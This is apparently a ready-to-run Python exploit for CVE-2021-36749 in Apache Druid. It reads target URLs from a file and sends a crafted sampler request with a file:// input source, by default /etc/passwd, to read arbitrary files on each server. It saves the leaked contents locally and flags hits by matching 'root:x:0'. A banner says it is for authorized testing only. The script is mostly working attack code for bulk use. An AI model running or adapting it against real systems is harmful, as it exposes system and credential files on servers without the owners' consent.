import requests
import re
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def load_file(path,target):
    url = target + "/druid/indexer/v1/sampler?for=connect"
    proxies = {
        "http":"127.0.0.1:8082",
        "https":"127.0.0.1:8082"
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8",
        "Accept": "application/json,text/plain,*/*"
    }
    json_data = {
        "type":"index",
        "spec":{
            "type":"index",
            "ioConfig":{
                "type":"index",
                "inputSource":{
                    "type":"http",
                    "uris":[
                        path
                    ]
                },
                "inputFormat":{
                    "type":"regex",
                    "pattern":"(.*)",
                    "listDelimiter":"56616469-6de2-9da4-efb8-8f416e6e6965",
                    "columns":[
                        "raw"
                    ]
                }
            },
            "dataSchema":{
                "dataSource":"sample",
                "timestampSpec":{
                    "column":"!!!_no_such_column_!!!",
                    "missingValue":"1970-01-01T00:00:00Z"
                },
                "dimensionsSpec":{
                }
            },
            "tuningConfig":{
                "type":"index"
            }
        },
        "samplerConfig":{
            "numRows":500,
            "timeoutMs":15000
        }
        }
    try:
        r = requests.post(url,headers=headers,json=json_data,timeout=10,verify=False,allow_redirects=False)

        target = re.search("((?<![.\d])(?:\d{1,3}\.){3}\d{1,3}(?![.\d]))", target).group(1) + ".txt"
        text = json.loads(r.text)
        if path_get == "":
            if r.status_code == 200:
                if 'root:x:0' in r.text:
                    with open(target,"w") as f:
                        for i in text["data"]:
                            f.write(i["input"]["raw"]+"\n")
                    print("%s存在Apache Druid任意文件读取漏洞,返回内容在本目录下%s文件中" % (url,target))
            else:
                print("%s可能不存在Apache Druid任意文件读取漏洞" % url)
        else:
            if r.status_code == 200:
                with open(target,"w") as f:
                    for i in text["data"]:
                        if i["input"]["raw"] is None:
                            f.write("\n")
                            continue
                        f.write(i["input"]["raw"] + "\n")
                print("%s可能存在Apache Druid任意文件读取漏洞,返回内容在本目录下%s文件中" % (url,target))
    except Exception as e:
        print("%s可能不存在Apache Druid任意文件读取漏洞" % url)

def usage():
    print("")
    print("CVE-2021-36749 / Apache Druid LoadData 任意文件读取漏洞")
    print("Code By:Jun_sheng @Github:https://github.com/jun-5heng/")
    print("橘子网络安全实验室 @https://0range.team/")
    print("")
    print("*************************警 告*****************************")
    print("本工具旨在帮助企业快速定位漏洞修复漏洞,仅限授权安全测试使用!")
    print("严格遵守《中华人民共和国网络安全法》,禁止未授权非法攻击站点!")
    print("***********************************************************")
    print("")

def main():
    usage()
    global path_get

    path_get = input("请输入需要读取的文件完整路径(默认为:file:///etc/passwd):")
    if path_get == "":
        path = "file:///etc/passwd"
    else:
        path = path_get

    with open("url.txt", 'r', encoding="utf-8") as e:
        lines = e.readlines()
        for target in lines:
            target = target.strip("\n")
            load_file(path,target)


main()
